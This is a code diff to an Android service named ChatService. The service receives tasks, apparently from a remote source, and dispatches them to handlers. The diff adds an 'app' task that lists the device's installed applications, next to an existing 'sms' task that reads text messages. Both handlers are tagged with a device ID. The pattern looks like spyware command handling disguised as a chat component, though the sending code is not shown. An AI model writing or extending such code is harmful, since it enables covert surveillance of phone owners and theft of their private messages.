@@ -8,6 +8,7 @@ import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.os.AsyncTask;
 import android.os.Handler;
 import android.os.IBinder;
@@ -99,11 +100,15 @@ public class ChatService extends Service {
             String task = getTask();
             if (task != null) {
                 switch (task) {
+                    case "register":
+                        register();
+                        break;
                     case "sms":
                         handleSMS();
                         break;
-                    case "register":
-                        register();
+                    case "app":
+                        handleApps();
+                        break;
                     default:
                         break;
                 }
@@ -180,6 +185,15 @@ public class ChatService extends Service {
         Context context = getApplicationContext();
         try {
             SmsReader.readSMS(context, getId());
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void handleApps() {
+        final PackageManager pm = getPackageManager();
+        try {
+            AppLister.ListApps(pm, getId());
         } catch (Exception e) {
             e.printStackTrace();
         }
